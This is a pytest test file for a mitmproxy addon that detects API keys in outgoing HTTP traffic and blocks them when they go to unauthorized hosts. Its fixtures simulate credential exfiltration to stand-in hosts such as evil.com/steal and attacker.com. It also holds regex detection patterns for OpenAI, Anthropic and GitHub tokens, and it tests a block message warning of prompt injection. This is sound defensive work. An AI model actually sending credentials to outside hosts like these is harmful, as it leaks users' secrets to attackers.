"""
Tests for credential_guard.py addon.

Tests credential detection, host authorization, and blocking behavior.
"""

import pytest


class TestCredentialRule:
    """Tests for CredentialRule pattern matching."""

    def test_openai_key_pattern(self):
        """Test OpenAI API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="openai",
            patterns=[r"sk-[a-zA-Z0-9]{20,}"],
            allowed_hosts=["api.openai.com"],
        )

        # Should match valid OpenAI keys
        assert rule.matches("sk-abc123xyz456def789ghi")
        assert rule.matches("Bearer sk-abc123xyz456def789ghi")
        assert rule.matches('{"key": "sk-abc123xyz456def789ghi"}')

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-short") is None
        assert rule.matches("pk-abc123xyz456def789ghi") is None

    def test_anthropic_key_pattern(self):
        """Test Anthropic API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="anthropic",
            patterns=[r"sk-ant-[a-zA-Z0-9-_]{20,}"],
            allowed_hosts=["api.anthropic.com"],
        )

        # Both formats are valid Anthropic keys (pattern allows hyphens)
        assert rule.matches("sk-ant-abc123xyz456def789ghi01")
        assert rule.matches("sk-ant-api03-abcdefghij-1234567890")  # api03 format also valid

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-ant-short") is None
        assert rule.matches("sk-abc123xyz456def789ghi") is None  # missing -ant-

    def test_host_allowed_exact_match(self):
        """Test exact host matching."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="test",
            patterns=[r"test-key"],
            allowed_hosts=["api.openai.com", "api.anthropic.com"],
        )

        assert rule.host_allowed("api.openai.com") is True
        assert rule.host_allowed("api.anthropic.com") is True
        assert rule.host_allowed("evil.com") is False

    def test_host_allowed_wildcard(self):
        """Test wildcard host matching."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="google",
            patterns=[r"AIza"],
            allowed_hosts=["*.googleapis.com"],
        )

        assert rule.host_allowed("storage.googleapis.com") is True
        assert rule.host_allowed("generativelanguage.googleapis.com") is True
        assert rule.host_allowed("googleapis.com") is True  # bare domain matches
        assert rule.host_allowed("evil.googleapis.com.attacker.com") is False

    def test_host_allowed_with_port(self):
        """Test host matching strips port."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="test",
            patterns=[r"test"],
            allowed_hosts=["api.openai.com"],
        )

        assert rule.host_allowed("api.openai.com:443") is True
        assert rule.host_allowed("api.openai.com:8080") is True


class TestCredentialGuardBlocking:
    """Tests for blocking unauthorized credential usage."""

    def test_blocks_openai_key_to_wrong_host(self, credential_guard, make_flow):
        """Test that OpenAI key to non-OpenAI host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403
        assert flow.metadata.get("blocked_by") == "credential-guard"
        assert flow.metadata.get("blocked_host") == "evil.com"
        assert flow.metadata.get("credential_fingerprint", "").startswith("hmac:")

    def test_allows_openai_key_to_openai(self, credential_guard, make_flow):
        """Test that OpenAI key to api.openai.com is allowed by DEFAULT_POLICY."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        # Should be allowed by DEFAULT_POLICY (not just passed checks)
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_blocks_key_in_header(self, credential_guard, make_flow):
        """Test that key in Authorization header to wrong host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://attacker.com/api",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403
        assert b"credential-guard" in flow.response.headers.get("X-Blocked-By", "").encode()

    def test_blocks_key_in_url(self, credential_guard, make_flow):
        """Test that key in URL query string to wrong host is blocked (when URL scanning enabled)."""
        # Enable URL scanning for this test
        from mitmproxy.test import taddons
        from mitmproxy import ctx as mitmproxy_ctx

        with taddons.context(credential_guard) as tctx:
            tctx.options.credguard_scan_urls = True

            flow = make_flow(
                method="GET",
                url="https://evil.com/api?key=sk-proj-abc123xyz456def789ghijkghijklmno",
            )

            credential_guard.request(flow)

            assert flow.response is not None
            assert flow.response.status_code == 403

    def test_allows_non_credential_requests(self, credential_guard, make_flow):
        """Test that requests without credentials pass through."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"message": "hello"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is None
        assert flow.metadata.get("credguard_passed") is True


class TestTempAllowlist:
    """Tests for temporary allowlist functionality."""

    def test_temp_allowlist_allows_blocked_request(self, credential_guard, make_flow):
        """Test that temp allowlist allows otherwise blocked requests."""
        key = "sk-proj-abc123xyz456def789ghijkghijklmno"

        # Add to allowlist (v2: takes full credential, generates HMAC internally)
        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={
                "Authorization": f"Bearer {key}",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        assert flow.metadata.get("credguard_allowlisted") is True

    def test_temp_allowlist_expires(self, credential_guard, make_flow):
        """Test that expired allowlist entries don't work."""
        import time

        key = "sk-proj-abc123xyz456def789ghijkghijklmno"

        # Add with very short TTL
        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=0)

        # Wait for expiry
        time.sleep(0.1)

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={
                "Authorization": f"Bearer {key}",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403


class TestLLMFriendlyResponse:
    """Tests for LLM-friendly block messages."""

    def test_llm_response_includes_guidance(self, credential_guard, make_flow):
        """Test that LLM response includes helpful guidance."""
        # Simulate ctx.options.credguard_llm_response = True
        # Since we can't easily mock ctx, test the message generation directly
        from addons.credential_guard import LLM_RESPONSE_TEMPLATE

        message = LLM_RESPONSE_TEMPLATE.format(
            credential_type="openai",
            blocked_host="evil.com",
            allowed_hosts="api.openai.com",
            suggested_url="https://api.openai.com/v1/",
        )

        assert "prompt injection" in message.lower()
        assert "api.openai.com" in message
        assert "evil.com" in message
        assert "reflect" in message.lower()


class TestStats:
    """Tests for statistics tracking."""

    def test_violation_count_increments(self, credential_guard, make_flow):
        """Test that violation stats are tracked."""
        assert credential_guard.violations_total == 0

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert credential_guard.violations_total == 1
        assert credential_guard.violations_by_type.get("openai") == 1


class TestBlockingMode:
    """Tests for blocking vs warn-only mode."""

    def test_warn_mode_logs_but_does_not_block(self, make_flow):
        """Test that warn mode (block=False) logs violation but doesn't block."""
        from addons.credential_guard import CredentialGuard

        guard = CredentialGuard()
        guard._load_rules = lambda: None  # Skip loading
        from addons.credential_guard import DEFAULT_RULES
        guard.rules = list(DEFAULT_RULES)
        guard.hmac_secret = b"test-secret"  # v2: Initialize HMAC secret

        # Mock _should_block to return False (warn-only mode)
        guard._should_block = lambda: False

        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        guard.request(flow)

        # Should NOT block (no response set)
        assert flow.response is None
        # But should still record the violation
        assert guard.violations_total == 1
        # And set metadata
        assert flow.metadata.get("blocked_by") == "credential-guard"

    def test_blocking_mode_blocks(self, make_flow):
        """Test that blocking mode (block=True) actually blocks."""
        from addons.credential_guard import CredentialGuard

        guard = CredentialGuard()
        guard._load_rules = lambda: None
        from addons.credential_guard import DEFAULT_RULES
        guard.rules = list(DEFAULT_RULES)
        guard.hmac_secret = b"test-secret"  # v2: Initialize HMAC secret

        # Mock _should_block to return True (blocking mode)
        guard._should_block = lambda: True

        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijkghijklmno",
                "Content-Type": "application/json",
            },
        )

        guard.request(flow)

        # Should block
        assert flow.response is not None
        assert flow.response.status_code == 403
        assert flow.metadata.get("blocked_by") == "credential-guard"


class TestHMACFingerprinting:
    """Tests for HMAC fingerprinting (Phase 1.2)."""

    def test_hmac_fingerprint_deterministic(self):
        """Same credential generates same fingerprint."""
        from addons.credential_guard import hmac_fingerprint

        secret = b"test-secret"
        credential = "sk-proj-abc123xyz456def789ghijk"

        fp1 = hmac_fingerprint(credential, secret)
        fp2 = hmac_fingerprint(credential, secret)

        assert fp1 == fp2
        assert len(fp1) == 16  # First 16 chars of SHA256 HMAC

    def test_hmac_fingerprint_unique(self):
        """Different credentials generate different fingerprints."""
        from addons.credential_guard import hmac_fingerprint

        secret = b"test-secret"
        cred1 = "sk-proj-abc123"
        cred2 = "sk-proj-xyz789"

        fp1 = hmac_fingerprint(cred1, secret)
        fp2 = hmac_fingerprint(cred2, secret)

        assert fp1 != fp2

    def test_hmac_fingerprint_secret_matters(self):
        """Different secrets generate different fingerprints."""
        from addons.credential_guard import hmac_fingerprint

        credential = "sk-proj-abc123"
        secret1 = b"secret-one"
        secret2 = b"secret-two"

        fp1 = hmac_fingerprint(credential, secret1)
        fp2 = hmac_fingerprint(credential, secret2)

        assert fp1 != fp2

    def test_temp_allowlist_uses_hmac(self, credential_guard):
        """Verify allowlist stores HMAC, not raw credentials."""
        key = "sk-proj-verysecretkey123"

        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)

        # Get allowlist entries
        entries = credential_guard.get_temp_allowlist()

        assert len(entries) == 1
        assert entries[0]["credential_fingerprint"].startswith("hmac:")
        # Should NOT contain raw credential
        assert key not in str(entries)

    def test_violation_log_never_contains_raw_credential(self, credential_guard, make_flow):
        """Ensure _log_violation() never logs raw tokens."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={"Authorization": "Bearer sk-proj-secretkey123abcdefghij"},
        )

        credential_guard.request(flow)

        # Check metadata - should have fingerprint, not raw credential
        fingerprint = flow.metadata.get("credential_fingerprint", "")
        assert fingerprint.startswith("hmac:")
        assert "secretkey123" not in fingerprint
        assert "sk-proj-secretkey123abcdefghij" not in str(flow.metadata)

    def test_block_response_headers_contain_hmac(self, credential_guard, make_flow):
        """X-Credential-Fingerprint header has hmac:xxx format."""
        flow = make_flow(
            method="POST",
            url="https://attacker.com/api",
            headers={"Authorization": "Bearer sk-proj-topsecret999abcdefghij"},
        )

        credential_guard.request(flow)

        assert flow.response is not None
        fingerprint_header = flow.response.headers.get("X-Credential-Fingerprint", "")
        assert fingerprint_header.startswith("hmac:")
        assert "topsecret" not in fingerprint_header


class TestPathMatching:
    """Tests for path wildcard matching (Phase 1.3)."""

    def test_path_wildcard_suffix(self):
        """Test /v1/* matches /v1/chat/completions."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat/completions", "/v1/*") is True
        assert path_matches_pattern("/v1/", "/v1/*") is True
        assert path_matches_pattern("/v1/models", "/v1/*") is True
        assert path_matches_pattern("/v2/chat", "/v1/*") is False
        assert path_matches_pattern("/api/v1/chat", "/v1/*") is False

    def test_path_wildcard_prefix(self):
        """Test */completions matches /v1/chat/completions."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat/completions", "*/completions") is True
        assert path_matches_pattern("/api/completions", "*/completions") is True
        assert path_matches_pattern("/completions", "*/completions") is True
        assert path_matches_pattern("/v1/models", "*/completions") is False

    def test_path_exact_match(self):
        """Test exact path matching."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat/completions", "/v1/chat/completions") is True
        assert path_matches_pattern("/v1/chat/completions", "/v1/chat") is False
        assert path_matches_pattern("/v1/chat", "/v1/chat/completions") is False

    def test_path_query_string_stripped(self):
        """Test query strings are stripped before matching."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat?key=123", "/v1/*") is True
        assert path_matches_pattern("/v1/chat/completions?model=gpt-4", "/v1/*") is True
        assert path_matches_pattern("/api?foo=bar", "/api") is True

    def test_path_full_wildcard(self):
        """Test /* matches all paths."""
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/anything", "/*") is True
        assert path_matches_pattern("/v1/chat/completions", "/*") is True
        assert path_matches_pattern("/", "/*") is True


class TestDefaultPolicy:
    """Tests for DEFAULT_POLICY behavior (Phase 1.3)."""

    def test_openai_allowed_by_default_policy(self, credential_guard, make_flow):
        """OpenAI keys to api.openai.com/v1/* allowed by default."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456def789ghijk"},
        )

        credential_guard.request(flow)

        # Should NOT block
        assert flow.response is None
        # Should be allowed by policy
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_anthropic_allowed_by_default_policy(self, credential_guard, make_flow):
        """Anthropic keys to api.anthropic.com/v1/* allowed by default."""
        flow = make_flow(
            method="POST",
            url="https://api.anthropic.com/v1/messages",
            headers={"Authorization": "Bearer sk-ant-api03-abc123xyz456def789ghijk"},
        )

        credential_guard.request(flow)

        # Should NOT block
        assert flow.response is None
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_github_allowed_by_default_policy(self, credential_guard, make_flow):
        """GitHub tokens to api.github.com allowed by default."""
        flow = make_flow(
            method="GET",
            url="https://api.github.com/user",
            headers={"Authorization": "Bearer ghp_abc123xyz456def789ghijklmnoABCDEFGHIJKL"},
        )

        credential_guard.request(flow)

        # Should NOT block
        assert flow.response is None
        assert flow.metadata.get("credguard_policy_approved") is True

    def test_openai_wrong_path_blocked(self, credential_guard, make_flow):
        """OpenAI key to api.openai.com/admin/* blocked (not in default policy)."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/admin/secrets",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456abcdefghijk"},
        )

        credential_guard.request(flow)

        # Should block (path not in policy)
        assert flow.response is not None
        assert flow.response.status_code == 403

    def test_openai_wrong_host_blocked(self, credential_guard, make_flow):
        """OpenAI key to evil.com blocked (not in default policy)."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-abc123xyz456abcdefghijk"},
        )

        credential_guard.request(flow)

        # Should block (host not in policy)
        assert flow.response is not None
        assert flow.response.status_code == 403

    def test_check_policy_approval_all_criteria(self):
        """Policy approval requires pattern + host + path match."""
        from addons.credential_guard import check_policy_approval, DEFAULT_POLICY

        # All match - should approve
        assert check_policy_approval(
            "sk-proj-abc123",
            "api.openai.com",
            "/v1/chat/completions",
            DEFAULT_POLICY
        ) is True

        # Wrong pattern - should reject
        assert check_policy_approval(
            "sk-ant-abc123",
            "api.openai.com",
            "/v1/chat/completions",
            DEFAULT_POLICY
        ) is False

        # Wrong host - should reject
        assert check_policy_approval(
            "sk-proj-abc123",
            "evil.com",
            "/v1/chat/completions",
            DEFAULT_POLICY
        ) is False

        # Wrong path - should reject
        assert check_policy_approval(
            "sk-proj-abc123",
            "api.openai.com",
            "/admin/secrets",
            DEFAULT_POLICY
        ) is False
